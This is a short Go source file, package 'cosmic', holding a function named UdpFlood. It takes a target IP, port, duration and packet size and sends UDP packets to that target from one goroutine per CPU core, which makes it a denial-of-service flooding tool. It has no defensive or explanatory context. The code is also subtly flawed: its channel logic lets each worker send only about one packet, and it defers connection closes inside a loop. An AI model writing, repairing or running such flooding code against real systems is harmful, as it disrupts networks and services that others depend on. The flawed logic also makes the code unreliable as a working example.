package cosmic

import (
	"net"
	"runtime"
	"sync"
	"time"
)

func UdpFlood(targetIP string, targetPort string, duration int, packetSize int) {
	targetAddr, _ := net.ResolveUDPAddr("udp", targetIP+":"+targetPort)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	numWorkers := runtime.NumCPU()

	var wg sync.WaitGroup
	workerChan := make(chan bool, numWorkers)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-workerChan:
					data := make([]byte, packetSize)
					conn, err := net.DialUDP("udp", nil, targetAddr)
					if err != nil {
						continue
					}
					defer conn.Close()
					conn.Write(data)
					time.Sleep(time.Millisecond * 10)
				case <-time.After(time.Until(endTime)):
					return
				}
			}
		}()
	}

	for i := 0; i < numWorkers; i++ {
		workerChan <- true
	}

	wg.Wait()
}
